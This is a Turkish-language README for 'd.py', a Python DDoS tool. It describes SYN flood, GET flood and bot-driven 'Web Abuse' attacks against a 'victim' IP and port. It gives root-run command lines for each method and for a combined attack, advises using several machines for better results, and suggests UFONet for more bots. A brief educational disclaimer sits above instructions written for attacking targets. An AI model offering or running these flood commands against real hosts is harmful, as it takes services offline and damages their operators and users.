# d.py
**d.py** SYN Taşması GET Taşması ve BOT Saldırı yöntemlerini kullanarak kurbana **DDoS** saldırısı gerçekleştirebileceğiniz bir programdır.Daha iyi sonuçlar için daha iyi bir internet bağlantısı ve birden fazla makineyle saldırı başlatmanız önerilir.

**Öğrenim amaçlıdır yaptığınız hiçbir illegal vs. işten sorumlu değilim**

# Yönetici Olarak Çalıştırma
Program **root** yetkileriyle açılmalıdır UNIX sistemlerinde bunu **sudo** yardımıyla yapabilirsiniz Windows sistemlerinde ise bir txt dosyasına komutları yazdıkdan sonra uzantısını .bat olarak değiştirip yönetici olarak çalıştırabilirsiniz.

# Kullanım


    Kullanım: d.py [--kurban IP] [--port PORT] [--thread ÇEKİRDEK]
    
      Parametreler:
        --kurban veya -k: Saldırıyı yapacağınız kişinin IP adresi
        --port veya -p: Kurbana saldıracağınız PORT numarası
        --thread veya -t: Her saldırı başına oluşturulacak çekirdek sayısı
        --syn veya -s: SYN Taşma Saldırısını metodunu aktive eder.
        --get veya -g: GET Saldırı metodunu aktive eder. Varsayılan saldırı tipidir.
        --bot veya -b: GET Saldırıları için BOT'ları aktive eder.
        --yardım veya -y: Yardım menüsünü gösterir.
    
      Örnekler:
        SYN Taşma Saldırısı:
           sudo python3 d.py --kurban [IP ADRESI] --port [PORT NUMARASI] --thread [ÇEKİRDEK SAYISI] --syn
        GET Taşma Saldırısı:
           sudo python3 d.py --kurban [IP ADRESI] --port [PORT NUMARASI] --thread [ÇEKİRDEK SAYISI] --get
        BOT Saldırısı:
           sudo python3 d.py --kurban [IP ADRESI] --port [PORT NUMARASI] --thread [ÇEKİRDEK SAYISI] --bot
        Karışık:
           sudo python3 d.py --kurban [IP ADRESI] --port [PORT NUMARASI] --thread [ÇEKİRDEK SAYISI] --bot --syn --get

# BOT'ların Ayarlanması
BOT'lar **bots.txt** isimli TXT dosyasının içerisine yazılır. BOT saldırıları **Web Abuse** metoduyla olur.
Daha fazla BOT istiyorsanız **UFONet** kullanabilirsiniz.
